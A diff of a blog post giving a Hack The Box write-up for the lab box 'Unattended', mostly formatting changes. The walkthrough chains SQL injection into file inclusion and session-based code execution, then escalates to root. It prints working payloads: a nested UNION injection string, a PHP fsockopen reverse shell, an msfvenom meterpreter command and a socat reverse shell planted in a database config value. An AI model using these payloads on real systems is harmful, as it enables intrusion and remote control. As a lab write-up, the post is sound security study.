@@ -2,31 +2,32 @@
 layout: post
 title: Hack The Box - Unattended
 categories: hack-the-box
-tags: [Linux, Web, SQLI, firewall, RCE, LFI, php, code analysis]
+tags: [linux, web, sqli, firewall, rce, lfi, php, code-analysis]
+description : My write-up for Unattended from Hack The Box.
 image: /hackthebox/unattended/0.png
 ---
 
 <hr>
-### Quick Summary
-#### Hey guys today Unattended retired and here's my write-up about it. Personally I think this box should have been rated as hard not medium, it really had a lot of stuff that were hard to find and exploit. There was an interesting `SQL` injection vulnerability that could be escalated to local file inclusion then to remote code execution and that's my favorite part about this box. It's a Linux box and its ip is `10.10.10.126`, I added it to `/etc/hosts` as `unattended.htb`. Let's jump right in !
+## Quick Summary
+<br> Hey guys today Unattended retired and here's my write-up about it. Personally I think this box should have been rated as hard not medium, it really had a lot of stuff that were hard to find and exploit. There was an interesting `SQL` injection vulnerability that could be escalated to local file inclusion then to remote code execution and that's my favorite part about this box. It's a Linux box and its ip is `10.10.10.126`, I added it to `/etc/hosts` as `unattended.htb`. Let's jump right in !
 ![](/images/hackthebox/unattended/0.png)
 <hr>
-### Nmap
-#### As always we will start with `nmap` to scan for open ports and services :
+## Nmap
+<br> As always we will start with `nmap` to scan for open ports and services :
 `nmap -sV -sT -sC unattended.htb`
 ![](/images/hackthebox/unattended/1.png)
-#### Only `http` and `https`, and surprisingly no `ssh`. Also the `ssl` certificate from the `https` port tells us that the common name is `www.nestedflanders.htb` so I added that to my hosts file :
+<br> Only `http` and `https`, and surprisingly no `ssh`. Also the `ssl` certificate from the `https` port tells us that the common name is `www.nestedflanders.htb` so I added that to my hosts file :
 ![](/images/hackthebox/unattended/2.png)
 <hr>
-### Web Enumeration
-### Checking `unattended.htb` on both 80 and 443 gives us a blank page :
+## Web Enumeration
+## Checking `unattended.htb` on both 80 and 443 gives us a blank page :
 ![](/images/hackthebox/unattended/3.png)
 <br>
 <br>
 ![](/images/hackthebox/unattended/4.png)
-#### `http://www.nestedflanders.htb` responds with a redirection to `https://www.nestedflanders.htb` which has the default Apache page :
+<br> `http://www.nestedflanders.htb` responds with a redirection to `https://www.nestedflanders.htb` which has the default Apache page :
 ![](/images/hackthebox/unattended/5.png)
-#### I used `wfuzz` to enumerate sub directories and it was weird to see both `index.php` and `index.html` with different content :
+<br> I used `wfuzz` to enumerate sub directories and it was weird to see both `index.php` and `index.html` with different content :
 ```
 root@kali:~/Desktop/HTB/boxes/unattended# wfuzz --hc 404 -c -u https://www.nestedflanders.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt 
 
@@ -52,16 +53,16 @@ ID   Response   Lines      Word         Chars          Payload
 002020:  C=200    368 L      933 W        10701 Ch        "index.html"
 003588:  C=200     93 L      282 W         5086 Ch        "server-status"
 ```
-#### Also there was a sub directory called `/dev`.
-#### `/dev` :
+<br> Also there was a sub directory called `/dev`.
+<br> `/dev` :
 ![](/images/hackthebox/unattended/6.png)
-#### `/index.html` :
+<br> `/index.html` :
 ![](/images/hackthebox/unattended/7.png)
-#### `/index.php`
+<br> `/index.php`
 ![](/images/hackthebox/unattended/8.png)
 <hr>
-### Nginx off-by-slash
-#### When I checked [`wappalyzer`](https://www.wappalyzer.com/) results I saw that it identified the web server as `nginx` and that was weird because we saw Apache's default page. Also when I went to `https://www.nestedflanders.htb/dev` I got a redirection to `https://www.nestedflanders.htb/dev/` (It added a slash `/`). 
+## Nginx off-by-slash
+<br> When I checked [`wappalyzer`](https://www.wappalyzer.com/) results I saw that it identified the web server as `nginx` and that was weird because we saw Apache's default page. Also when I went to `https://www.nestedflanders.htb/dev` I got a redirection to `https://www.nestedflanders.htb/dev/` (It added a slash `/`). 
 ```
 root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev
 <html>
@@ -77,7 +78,7 @@ root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb
 root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev/
 dev site has been moved to his own server
 ```
-#### As demonstrated in [this document](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) there can be a vulnerability because of this. I gave it a try by adding `..` after `dev`:
+<br> As demonstrated in [this document](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) there can be a vulnerability because of this. I gave it a try by adding `..` after `dev`:
 ```
 root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../
 <html>
@@ -88,7 +89,7 @@ root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb
 </body>
 </html>
 ```
-#### We got `403` maybe because we are out of  `html` directory, I added `/html/index.php` and I successfully got the source of the index page :
+<br> We got `403` maybe because we are out of  `html` directory, I added `/html/index.php` and I successfully got the source of the index page :
 ```
 root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html
 <html>
@@ -212,20 +213,20 @@ $conn->close();
 ```
 <hr>
 <br>
-### SQLI
-#### By looking at the `php` code we can see database credentials :
+## SQLI
+<br> By looking at the `php` code we can see database credentials :
 ```
 $servername = "localhost";
 $username = "nestedflanders";
 $password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
 $db = "neddy";
 ```
-#### Those can be helpful later.
-#### Another thing I noticed was this include :
+<br> Those can be helpful later.
+<br> Another thing I noticed was this include :
 ```
 include "6fb17817efb4131ae4ae1acae0f7fd48.php";
 ```
-#### I downloaded that page but it had nothing interesting :
+<br> I downloaded that page but it had nothing interesting :
 ```
 root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/6fb17817efb4131ae4ae1acae0f7fd48.php
 <?php
@@ -240,7 +241,7 @@ foreach ($_COOKIE as $key => $val) {
 
 /* removed everything because of undergoing investigation, please check dev and staging */
 ```
-#### We can also see this :
+<br> We can also see this :
 ```
 $valid_ids = array (25,465,587);
 	if ( (array_key_exists('id', $_GET)) && (intval($_GET['id']) == $_GET['id']) && (in_array(intval($_GET['id']),$valid_ids)) ) {
@@ -249,10 +250,10 @@ $valid_ids = array (25,465,587);
 		$sql = "SELECT name FROM idname where id = '25'";
 	}
 ```
-#### It defines an array called `valid_ids`, then it checks the `GET` parameter `id`, if it exists and it's in the `valid_ids` array, it will append it to this `SQL` query : `SELECT name FROM idname where id = [ID HERE]`.
-#### To understand what's happening in a better way let's check the website again.
+<br> It defines an array called `valid_ids`, then it checks the `GET` parameter `id`, if it exists and it's in the `valid_ids` array, it will append it to this `SQL` query : `SELECT name FROM idname where id = [ID HERE]`.
+<br> To understand what's happening in a better way let's check the website again.
 ![](/images/hackthebox/unattended/8.png)
-#### There are 3 pages, `main`, `about` and `contact`.  By visiting them we notice that the `id` parameter is added and each page has one of the ids we saw in the `php` code : 25 (main), 465 (about) and 587 (contact).
+<br> There are 3 pages, `main`, `about` and `contact`.  By visiting them we notice that the `id` parameter is added and each page has one of the ids we saw in the `php` code : 25 (main), 465 (about) and 587 (contact).
 ![](/images/hackthebox/unattended/9.png)
 <br>
 <br>
@@ -260,11 +261,11 @@ $valid_ids = array (25,465,587);
 <br>
 <br>
 ![](/images/hackthebox/unattended/11.png)
-#### I tried adding a single quote to `https://www.nestedflanders.htb/index.php?id=465` and I got the main page instead of the about page because the query failed :
+<br> I tried adding a single quote to `https://www.nestedflanders.htb/index.php?id=465` and I got the main page instead of the about page because the query failed :
 ![](/images/hackthebox/unattended/12.png)
-#### When I fixed the query it worked :
+<br> When I fixed the query it worked :
 ![](/images/hackthebox/unattended/13.png)
-#### I started `sqlmap` to automate it and dump the database :
+<br> I started `sqlmap` to automate it and dump the database :
 ```
 root@kali:~/Desktop/HTB/boxes/unattended# sqlmap -u https://www.nestedflanders.htb/index.php?id=465 --dump-all
        __H__
@@ -362,7 +363,7 @@ web application technology: Nginx 1.10.3
 back-end DBMS: MySQL >= 5.0.12
 [17:16:20] [INFO] sqlmap will dump entries of all tables from all databases now
 ```
-#### There are 2 databases, `information_schema` and `neddy` :
+<br> There are 2 databases, `information_schema` and `neddy` :
 ```
 [17:20:49] [INFO] the back-end DBMS is MySQL
 web application technology: Nginx 1.10.3
@@ -379,7 +380,7 @@ back-end DBMS: MySQL >= 5.0.12
 [17:21:21] [INFO] retrieved: neddy
 [17:21:21] [INFO] fetching tables for databases: 'information_schema, neddy'
 ```
-#### We don't need `information_schema` in anything and also dumping `neddy` with that kind of injection would take a lot of time, let's take a look at the tables. 
+<br> We don't need `information_schema` in anything and also dumping `neddy` with that kind of injection would take a lot of time, let's take a look at the tables. 
 ```
 [17:37:48] [INFO] fetching tables for database: 'neddy'
 [17:37:48] [INFO] fetching number of tables for database 'neddy'
@@ -459,7 +460,7 @@ back-end DBMS: MySQL >= 5.0.12
 [17:37:48] [INFO] resumed: 11
 [17:37:48] [INFO] resumed: creditLimit
 ```
-#### I only dumped `filepath` and `idname` because these are the ones I saw in the source of `index.php`.
+<br> I only dumped `filepath` and `idname` because these are the ones I saw in the source of `index.php`.
 ```
 root@kali:~/Desktop/HTB/boxes/unattended# sqlmap -u https://www.nestedflanders.htb/index.php?id=465 -D neddy -T filepath --dump --threads 10                  
        __H__
@@ -644,10 +645,10 @@ Table: idname
 ```
 <br>
 <hr>
-### SQLI to LFI
-#### Now we have the actual file names, `about` for example (`/47c1ba4f7b1edf28ea0e2bb250717093.php `) :
+## SQLI to LFI
+<br> Now we have the actual file names, `about` for example (`/47c1ba4f7b1edf28ea0e2bb250717093.php `) :
 ![](/images/hackthebox/unattended/14.png)
-#### It's just the text and nothing else. We can also verify that there is nothing hidden by checking the `php` source of the three pages :
+<br> It's just the text and nothing else. We can also verify that there is nothing hidden by checking the `php` source of the three pages :
 ```
 root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/47c1ba4f7b1edf28ea0e2bb250717093.php
 <body class="container">
@@ -683,10 +684,10 @@ As a partial recover, we offer you a printed portfolio: just drop us an email wi
 </div>
 </body>
 ```
-#### First guess will be that the page name gets queried from the database table `idname` then the path (or the actual `php` file name) gets queried from the database table `filepath` then it includes that page to the index page. And that's true but since we have the source of `index.php` let's also look at it.
-#### By looking at the dumped tables and the source of `index.php` again we can understand the following :
-#### The `SQL` injectable query we just exploited is part of the function `getTplFromID` which returns the page name after querying it from the table `idname` based on our given id number : 
-#### Function `getTplFromID()` :
+<br> First guess will be that the page name gets queried from the database table `idname` then the path (or the actual `php` file name) gets queried from the database table `filepath` then it includes that page to the index page. And that's true but since we have the source of `index.php` let's also look at it.
+<br> By looking at the dumped tables and the source of `index.php` again we can understand the following :
+<br> The `SQL` injectable query we just exploited is part of the function `getTplFromID` which returns the page name after querying it from the table `idname` based on our given id number : 
+<br> Function `getTplFromID()` :
 ```
 function getTplFromID($conn) {
 	global $debug;
@@ -710,7 +711,7 @@ function getTplFromID($conn) {
 	return $ret;
 }
 ```
-#### Table `idname` :
+<br> Table `idname` :
 ```
 +-----+-------------+----------+
 | id  | name        | disabled |
@@ -723,8 +724,8 @@ function getTplFromID($conn) {
 | 587 | contact     | 0        |
 +-----+-------------+----------+
 ```
-#### There is another function called `getPathFromTpl` which takes the returned page name and queries the actual path from the table `filepath` then returns it :
-#### Function `getPathFromTpl()` : 
+<br> There is another function called `getPathFromTpl` which takes the returned page name and queries the actual path from the table `filepath` then returns it :
+<br> Function `getPathFromTpl()` : 
 ```
 function getPathFromTpl($conn,$tpl) {
 	global $debug;
@@ -740,7 +741,7 @@ function getPathFromTpl($conn,$tpl) {
 	return $ret;
 }
 ```
-#### Table `filepath` :
+<br> Table `filepath` :
 ```
 +---------+--------------------------------------+
 | name    | path                                 |
@@ -750,17 +751,17 @@ function getPathFromTpl($conn,$tpl) {
 | main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
 +---------+--------------------------------------+
 ```
-#### The first function gets called and its return value gets saved in the variable `tpl` : `$tpl = getTplFromID($conn);`
-#### Then the second function gets called with the variable `tpl` and its return value gets saved in the variable `inc`
-#### And finally it includes that page `include("$inc");`
-#### We have a `SQL` injection vulnerability which we can use to control what's being included, in other words we have a local file inclusion vulnerability.
-#### After some attempts to read `/etc/passwd` this payload worked : `' UNION SELECT "main' UNION SELECT '/etc/passwd';-- ";--`
+<br> The first function gets called and its return value gets saved in the variable `tpl` : `$tpl = getTplFromID($conn);`
+<br> Then the second function gets called with the variable `tpl` and its return value gets saved in the variable `inc`
+<br> And finally it includes that page `include("$inc");`
+<br> We have a `SQL` injection vulnerability which we can use to control what's being included, in other words we have a local file inclusion vulnerability.
+<br> After some attempts to read `/etc/passwd` this payload worked : `' UNION SELECT "main' UNION SELECT '/etc/passwd';-- ";--`
 ![](/images/hackthebox/unattended/15.png)
 <br>
 <hr>
-### LFI to RCE
-#### We need to get `RCE` from this `LFI`. If I could include my session file (`/var/lib/php/session/sess_[SESSION COOKIE]`) then I could put `php` code in a cookie and include it. My session cookie was `c5vmccsqkle2rdionj28kit221`.
-#### Request :
+## LFI to RCE
+<br> We need to get `RCE` from this `LFI`. If I could include my session file (`/var/lib/php/session/sess_[SESSION COOKIE]`) then I could put `php` code in a cookie and include it. My session cookie was `c5vmccsqkle2rdionj28kit221`.
+<br> Request :
 ```
 GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
 Host: www.nestedflanders.htb
@@ -773,7 +774,7 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 Cache-Control: max-age=0
 ```
-#### Response :
+<br> Response :
 ```
 HTTP/1.1 200 OK
 Server: nginx/1.10.3
@@ -801,8 +802,8 @@ PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";
 </body>
 </html>
 ```
-#### It worked, I created a cookie and called it `RCE`, any `php` code I put there will be included and executed so we can get `RCE` by `system()` or `passthru()`, let's try `whoami` :
-#### Request :
+<br> It worked, I created a cookie and called it `RCE`, any `php` code I put there will be included and executed so we can get `RCE` by `system()` or `passthru()`, let's try `whoami` :
+<br> Request :
 ```
 GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
 Host: www.nestedflanders.htb
@@ -815,7 +816,7 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 Cache-Control: max-age=0
 ```
-#### Response :
+<br> Response :
 ```
 HTTP/1.1 200 OK
 Server: nginx/1.10.3
@@ -843,8 +844,8 @@ PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";RCE|s:26:"www-data
 </body>
 </html>
 ```
-#### I spent a lot of time trying to get a reverse shell and I couldn't, so I checked `iptables` rules :
-#### Request :
+<br> I spent a lot of time trying to get a reverse shell and I couldn't, so I checked `iptables` rules :
+<br> Request :
 ```
 GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
 Host: www.nestedflanders.htb
@@ -857,7 +858,7 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 Cache-Control: max-age=0
 ```
-#### Response :
+<br> Response :
 ```
 HTTP/1.1 200 OK
 Server: nginx/1.10.3
@@ -901,14 +902,14 @@ COMMIT
 </body>
 </html>
 ```
-#### We can only get a reverse shell on ports 443 and 80. My problem was trying to get a connection on port 1337. 
-#### `nc` wasn't on the box so I used `php` to get a reverse shell.
-#### `shell.sh` :
+<br> We can only get a reverse shell on ports 443 and 80. My problem was trying to get a connection on port 1337. 
+<br> `nc` wasn't on the box so I used `php` to get a reverse shell.
+<br> `shell.sh` :
 ```
 #!/bin/bash
 php -r '$sock=fsockopen("10.10.xx.xx",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-#### I started a python server on port 80 then I downloaded the shell file on the box and executed it :
+<br> I started a python server on port 80 then I downloaded the shell file on the box and executed it :
 ```
 GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
 Host: www.nestedflanders.htb
@@ -934,9 +935,9 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 Cache-Control: max-age=0
 ```
-#### And we get a shell as `www-data` :
+<br> And we get a shell as `www-data` :
 ![](/images/hackthebox/unattended/16.png)
-#### But I didn't like 2 things about this shell. First thing, it wasn't a tty shell. Second thing, with only 2 ports available It was annoying because I usually need more shells. So I created a `php` `meterpreter` payload because with `meterpreter` I can spawn as many shells as I want and they can be tty shells.
+<br> But I didn't like 2 things about this shell. First thing, it wasn't a tty shell. Second thing, with only 2 ports available It was annoying because I usually need more shells. So I created a `php` `meterpreter` payload because with `meterpreter` I can spawn as many shells as I want and they can be tty shells.
 ```
 root@kali:~/Desktop/HTB/boxes/unattended# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=80 > shell.php                                                                                          
 [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
@@ -978,11 +979,11 @@ msf5 exploit(multi/handler) > run
 meterpreter >
 ```
 ![](/images/hackthebox/unattended/17.png)
-#### Note : I stopped the python server before starting the listener because both of them use port 80.
+<br> Note : I stopped the python server before starting the listener because both of them use port 80.
 <br>
 <hr>
-### Shell as guly, User Flag
-#### There is only one user on the box : `guly`, and we can't access the home directory :
+## Shell as guly, User Flag
+<br> There is only one user on the box : `guly`, and we can't access the home directory :
 ```
 www-data@unattended:/tmp$ ls -la /home     
 ls -la /home
@@ -995,7 +996,7 @@ cd /home/guly
 bash: cd: /home/guly: Permission denied
 www-data@unattended:/tmp$ 
 ```
-#### Earlier we got the database credentials from `index.php` and we couldn't dump the whole database because of the slow process, let's check the database :
+<br> Earlier we got the database credentials from `index.php` and we couldn't dump the whole database because of the slow process, let's check the database :
 ```
 www-data@unattended:/tmp$ mysql -h localhost -u nestedflanders -p
 mysql -h localhost -u nestedflanders -p
@@ -1040,7 +1041,7 @@ show tables;
 
 MariaDB [neddy]> 
 ```
-#### `config` looks interesting, let's check it :
+<br> `config` looks interesting, let's check it :
 ```
 MariaDB [neddy]> select * from config;                                                                                                                                                                             
 select * from config;
@@ -1105,11 +1106,11 @@ select * from config;
 
 MariaDB [neddy]>
 ```
-#### The row with id 86 looks interesting. It has a value of some `perl` scripts :
+<br> The row with id 86 looks interesting. It has a value of some `perl` scripts :
 ```
 /home/guly/checkbase.pl;/home/guly/checkplugins.pl;
 ```
-#### Apparently these scripts get executed from time to time, we can't read these scripts or replace them, but we can change the value of that configuration from the database and put a reverse shell command. There's no `nc` so I used `socat` :
+<br> Apparently these scripts get executed from time to time, we can't read these scripts or replace them, but we can change the value of that configuration from the database and put a reverse shell command. There's no `nc` so I used `socat` :
 ```
 MariaDB [neddy]> update config set option_value="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.xx.xx:443;" where id=86;
 Query OK, 0 rows affected (0.00 sec)
@@ -1129,11 +1130,11 @@ select * from config;
 MariaDB [neddy]>
 ```
 ![](/images/hackthebox/unattended/18.png)
-#### We owned user.
+<br> We owned user.
 <br>
 <hr>
-### initrd, Root Flag
-#### After getting a shell as `guly` I terminated my `meterpreter` session as `www-data` and got a new one as `guly` :
+## initrd, Root Flag
+<br> After getting a shell as `guly` I terminated my `meterpreter` session as `www-data` and got a new one as `guly` :
 ```
 guly@unattended:/tmp$ wget http://10.10.xx.xx/shell.php
 wget http://10.10.xx.xx/shell.php
@@ -1152,7 +1153,7 @@ php ./shell.php
 /*
 ```
 ![](/images/hackthebox/unattended/19.png)
-#### I noticed that `guly` was in the local group `grub`, I searched for files that are owned by this group :
+<br> I noticed that `guly` was in the local group `grub`, I searched for files that are owned by this group :
 ```
 guly@unattended:/tmp$ find / -group grub
 find / -group grub
@@ -1202,7 +1203,7 @@ find: ‘/run/log/journal/b0fa41b1a9b848e8b54df33b345577c8’: Permission denied
 find: ‘/run/systemd/inaccessible’: Permission denied
 guly@unattended:/tmp$
 ```
-#### I could only access `/boot/initrd.img-4.9.0-8-amd64`, so I created a directory in `/tmp` and copied it there.
+<br> I could only access `/boot/initrd.img-4.9.0-8-amd64`, so I created a directory in `/tmp` and copied it there.
 ```
 guly@unattended:/tmp$ mkdir initrd
 mkdir initrd
@@ -1218,8 +1219,8 @@ drwxrwxrwt 14 root root      300 Aug 23 13:34 ..
 -rw-r-----  1 guly guly 19715792 Aug 23 13:34 initrd.img-4.9.0-8-amd64
 guly@unattended:/tmp/initrd$ 
 ```
-#### `initrd` is the abbreviation for [initial ramdisk](https://en.wikipedia.org/wiki/Initial_ramdisk). 
-#### Using `file` on it says that it's a `gzip` archive :
+<br> `initrd` is the abbreviation for [initial ramdisk](https://en.wikipedia.org/wiki/Initial_ramdisk). 
+<br> Using `file` on it says that it's a `gzip` archive :
 ```
 guly@unattended:/tmp/initrd$ ls -la
 ls -la
@@ -1231,7 +1232,7 @@ guly@unattended:/tmp/initrd$ file initrd.img-4.9.0-8-amd64
 file initrd.img-4.9.0-8-amd64
 initrd.img-4.9.0-8-amd64: gzip compressed data, last modified: Fri Aug 23 09:26:41 2019, from Unix
 ```
-#### I renamed it to `initrd.img-4.9.0-8-amd64.gz`  then I used `gzip` to extract it :
+<br> I renamed it to `initrd.img-4.9.0-8-amd64.gz`  then I used `gzip` to extract it :
 ```
 guly@unattended:/tmp/initrd$ mv initrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64.gz
 4.gznitrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64
@@ -1244,17 +1245,17 @@ drwxr-xr-x  2 guly guly       60 Aug 23 13:56 .
 drwxrwxrwt 14 root root      300 Aug 23 13:56 ..
 -rw-r-----  1 guly guly 62110208 Aug 23 13:54 initrd.img-4.9.0-8-amd64
 ```
-#### The new file is a `cpio` archive :
+<br> The new file is a `cpio` archive :
 ```
 guly@unattended:/tmp/initrd$ file initrd.img-4.9.0-8-amd64
 file initrd.img-4.9.0-8-amd64
 initrd.img-4.9.0-8-amd64: ASCII cpio archive (SVR4 with no CRC)
 ```
-#### To extract it :
+<br> To extract it :
 ```
 guly@unattended:/tmp/initrd$ cpio -idvm < initrd.img-4.9.0-8-amd64
 ```
-#### After extracting it we get a lot of files :
+<br> After extracting it we get a lot of files :
 ```
 guly@unattended:/tmp/initrd$ ls -la
 ls -la
@@ -1274,14 +1275,14 @@ drwxr-xr-x  2 guly guly     1140 Aug 23 13:56 sbin
 drwxr-xr-x  8 guly guly      220 Aug 23 13:56 scripts
 guly@unattended:/tmp/initrd$ 
 ```
-#### Searching for `guly` in these files reveals this interesting comment in a script called `cryptroot` :
+<br> Searching for `guly` in these files reveals this interesting comment in a script called `cryptroot` :
 ```
 guly@unattended:/tmp/initrd$ grep -r guly *             
 grep -r guly *
 Binary file initrd.img-4.9.0-8-amd64 matches           
 scripts/local-top/cryptroot:      # guly: we have to deal with lukfs password sync when root changes her one
 ```
-#### I checked that part of the script :
+<br> I checked that part of the script :
 ```
                if [ ! -e "$NEWROOT" ]; then
       # guly: we have to deal with lukfs password sync when root changes her one
@@ -1292,14 +1293,14 @@ scripts/local-top/cryptroot:      # guly: we have to deal with lukfs password sy
                                 continue
 
 ```
-#### This line `/sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen` generates root password and pipes it to `$cryptopen`. We don't have permission to execute `uinitrd` :
+<br> This line `/sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen` generates root password and pipes it to `$cryptopen`. We don't have permission to execute `uinitrd` :
 ```
 guly@unattended:/tmp/initrd$ /sbin/uinitrd c0m3s3f0ss34nt4n1
 /sbin/uinitrd c0m3s3f0ss34nt4n1
 bash: /sbin/uinitrd: Permission denied
 guly@unattended:/tmp/initrd$ 
 ```
-#### But in the extracted files we have the same binary and we can execute it :
+<br> But in the extracted files we have the same binary and we can execute it :
 ```
 guly@unattended:/tmp/initrd$ ls -la
 ls -la
@@ -1323,11 +1324,12 @@ ls -la sbin | grep uinitrd
 guly@unattended:/tmp/initrd$ 
 ```
 ![](/images/hackthebox/unattended/20.png)
-#### And we owned root !
-#### That's it , Feedback is appreciated !
-#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
-#### Thanks for reading.
+<br> And we owned root !
+<br> That's it , Feedback is appreciated !
+<br> Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
+<br> Thanks for reading.
 <br>
 <br>
-#### Previous Hack The Box write-up : [Hack The Box - Helpline](/hack-the-box/helpline/)
+<br> Previous Hack The Box write-up : [Hack The Box - Helpline](/hack-the-box/helpline/)
+<br> Next Hack The Box write-up : [Hack The Box - OneTwoSeven](/hack-the-box/onetwoseven/)
 <hr>
